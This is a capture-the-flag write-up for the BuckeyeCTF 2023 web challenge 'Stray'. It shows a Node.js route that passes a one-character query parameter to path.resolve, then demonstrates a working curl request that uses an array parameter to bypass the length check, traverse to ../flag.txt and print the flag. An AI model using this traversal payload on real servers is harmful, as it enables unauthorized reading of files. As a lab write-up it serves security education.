# BuckeyeCTF 2023

## Stray

> Stuck on what to name your stray cat?
>
>  Author: mbund
>
> [`export.zip`](export.zip)

Tags: _web_

## Solution
For this challenge we get a website that provides a `Welcome to the Cat Name API!`. We can query by calling `/cat?category={...}` and specifying a category. We also get the source code for this challenge so inspect whats going on.

```python
app.get("/cat", (req, res) => {
  let { category } = req.query;

  console.log(category);

  if (category.length == 1) {
    const filepath = path.resolve("./names/" + category);
    const lines = fs.readFileSync(filepath, "utf-8").split("\n");
    const name = lines[Math.floor(Math.random() * lines.length)];

    res.status(200);
    res.send({ name });
    return;
  }

  res.status(500);
  res.send({ error: "Unable to generate cat name" });
});
```

So this is the interesting part. The category is passed to `path.resolve` so this looks like we have a [`lfi`](https://en.wikipedia.org/wiki/File_inclusion_vulnerability) here. The only thing is, the category cannot be longer than `1` in length, so just passing `../flag.txt` will not work. Thankfully we can wrap the payload to pass the check by providing an array with our path. The array will have a length of `1` and the concatination to the string will resolve the array item so we are left with the full path.

```bash
$ curl https://stray.chall.pwnoh.io/cat?category[]=../flag.txt
{"name":"bctf{j4v45cr1p7_15_4_6r347_l4n6u463}"}
```

Flag `bctf{j4v45cr1p7_15_4_6r347_l4n6u463}`